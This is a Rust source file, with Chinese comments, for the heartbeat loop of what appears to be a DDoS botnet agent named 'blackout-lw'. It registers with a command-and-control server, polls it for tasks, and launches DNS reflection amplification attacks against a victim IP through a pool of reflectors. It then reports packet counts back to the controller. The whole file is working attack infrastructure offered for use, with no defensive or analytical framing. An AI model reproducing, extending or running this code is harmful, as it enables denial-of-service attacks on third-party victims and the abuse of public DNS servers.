// 心跳主循环：注册 → 轮询任务 → 执行 → 上报 → 踢出自毁。
// 心跳即任务轮询：一次 POST 完成在线证明 + 任务领取 + 踢出检查。

use crate::attack::{run_dns_reflection, Stats};
use crate::config::Config;
use crate::http;
use crate::reflector;
use crate::spoof::{fmt_ip, parse_ipv4};
use std::time::Duration;

#[derive(Debug)]
pub struct HError(pub String);

impl std::fmt::Display for HError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl From<http::HttpError> for HError {
    fn from(e: http::HttpError) -> Self {
        HError(e.0)
    }
}

// 任务 JSON（与 Controller /api/lw/heartbeat 响应对齐）
#[derive(serde::Deserialize, Default)]
struct TaskMsg {
    task_id: String,
    target: String,
    method: String,
    duration: u64,
    threads: u32,
    #[serde(default)]
    targets: Vec<String>,
}

#[derive(serde::Deserialize)]
struct HeartbeatResp {
    #[serde(default)]
    task: Option<TaskMsg>,
    #[serde(default)]
    kick: bool,
}

#[derive(serde::Serialize)]
struct HeartbeatReq<'a> {
    token: &'a str,
    node_id: &'a str,
}

pub fn run(cfg: &Config) -> Result<(), HError> {
    let node_id = register(cfg)?;
    eprintln!("blackout-lw: registered as {node_id}");

    let stats = std::sync::Arc::new(Stats::default());

    loop {
        // 心跳（= 任务轮询）
        let hb_json = serde_json::to_string(&HeartbeatReq { token: &cfg.token, node_id: &node_id })
            .map_err(|e| HError(e.to_string()))?;
        let resp = http::post_json(
            &cfg.controller,
            "/api/lw/heartbeat",
            &cfg.token,
            &hb_json,
            Duration::from_secs(10),
        )?;

        if resp.status == 401 || resp.status == 403 {
            return Err(HError("controller rejected token (401/403)".into()));
        }
        if resp.status != 200 {
            // 控制器不可用：退避重试
            eprintln!("blackout-lw: heartbeat http {}", resp.status);
            std::thread::sleep(Duration::from_secs(5));
            continue;
        }

        let hb: HeartbeatResp = serde_json::from_str(&resp.body)
            .map_err(|e| HError(format!("heartbeat parse: {e} body={}", resp.body)))?;

        if hb.kick {
            eprintln!("blackout-lw: KICKED by controller, exiting (self-remove optional)");
            return Ok(());
        }

        if let Some(task) = hb.task {
            // 任务执行失败（拉池失败/完成上报丢失等）不退出主循环：
            // 控制器端有超时重派兜底，进程保持心跳在线。
            if let Err(e) = run_task(cfg, &node_id, &task, &stats) {
                eprintln!("blackout-lw: task {} error: {e}", task.task_id);
            }
        }

        std::thread::sleep(Duration::from_secs(cfg.heartbeat_secs));
    }
}

fn register(cfg: &Config) -> Result<String, HError> {
    let body = format!(
        r#"{{"token":"{}","platform":"{}","arch":"{}"}}"#,
        cfg.token,
        std::env::consts::OS,
        std::env::consts::ARCH
    );
    let resp = http::post_json(&cfg.controller, "/api/lw/register", &cfg.token, &body, Duration::from_secs(10))?;
    if resp.status != 200 {
        return Err(HError(format!("register http {}", resp.status)));
    }
    #[derive(serde::Deserialize)]
    struct RegResp {
        #[serde(default)]
        node_id: String,
    }
    let r: RegResp = serde_json::from_str(&resp.body).map_err(|e| HError(format!("register parse: {e}")))?;
    if r.node_id.is_empty() {
        return Err(HError("register: empty node_id".into()));
    }
    Ok(r.node_id)
}

fn run_task(cfg: &Config, node_id: &str, task: &TaskMsg, stats: &std::sync::Arc<Stats>) -> Result<(), HError> {
    if task.method != "dns_reflector" {
        eprintln!("blackout-lw: task {} method {} not supported by lw, skipping", task.task_id, task.method);
        return Ok(());
    }
    let victim_ip = match parse_ipv4(task.target.split(':').next().unwrap_or("")) {
        Some(ip) => ip,
        None => {
            eprintln!("blackout-lw: task {} bad victim target {}", task.task_id, task.target);
            return Ok(());
        }
    };
    // 拉池（优先用任务内嵌 targets，否则拉全池）
    let reflectors = if !task.targets.is_empty() {
        task.targets.iter().filter_map(|s| reflector::parse_entry(s)).collect()
    } else {
        reflector::fetch_dns_pool(&cfg.controller, &cfg.token, 2000)?
    };
    if reflectors.is_empty() {
        eprintln!("blackout-lw: task {} no reflectors, skipping", task.task_id);
        return Ok(());
    }

    let spec = crate::attack::TaskSpec {
        task_id: task.task_id.clone(),
        victim_ip,
        duration_secs: task.duration,
        threads: task.threads,
        reflectors,
        max_pps: cfg.max_pps,
    };
    eprintln!(
        "blackout-lw: task {} dns_reflector -> {} ({}) threads={} dur={}s",
        task.task_id, task.target, fmt_ip(victim_ip), spec.threads, spec.duration_secs
    );
    // 差值统计：Stats 跨任务累计，只上报本任务的增量包数
    let p0 = stats.packets();
    let b0 = stats.bytes();
    let e0 = stats.errors();
    run_dns_reflection(&spec, std::sync::Arc::clone(stats));
    let dp = stats.packets() - p0;
    let db = stats.bytes() - b0;
    let de = stats.errors() - e0;
    eprintln!("blackout-lw: task {} done (pkts={})", task.task_id, dp);
    // 完成上报：失败重试 3 次。上报丢失会让 Controller 任务超时重派、
    // 整段重跑一遍完整时长，值得重试。
    let mut last_err: Option<HError> = None;
    for _ in 0..3 {
        match report(cfg, node_id, &task.task_id, dp, db, de, stats.pps(), true) {
            Ok(()) => return Ok(()),
            Err(e) => {
                last_err = Some(e);
                std::thread::sleep(Duration::from_secs(2));
            }
        }
    }
    Err(HError(format!(
        "report failed after retries: {}",
        last_err.map(|e| e.0).unwrap_or_default()
    )))
}

fn report(
    cfg: &Config,
    node_id: &str,
    task_id: &str,
    packets: u64,
    bytes: u64,
    errors: u64,
    pps: u64,
    finished: bool,
) -> Result<(), HError> {
    let body = format!(
        r#"{{"token":"{}","node_id":"{}","task_id":"{}","packets":{},"bytes":{},"errors":{},"pps":{},"finished":{}}}"#,
        cfg.token, node_id, task_id, packets, bytes, errors, pps, finished
    );
    let resp = http::post_json(&cfg.controller, "/api/lw/report", &cfg.token, &body, Duration::from_secs(10))?;
    if resp.status != 200 {
        return Err(HError(format!("report http {}", resp.status)));
    }
    Ok(())
}
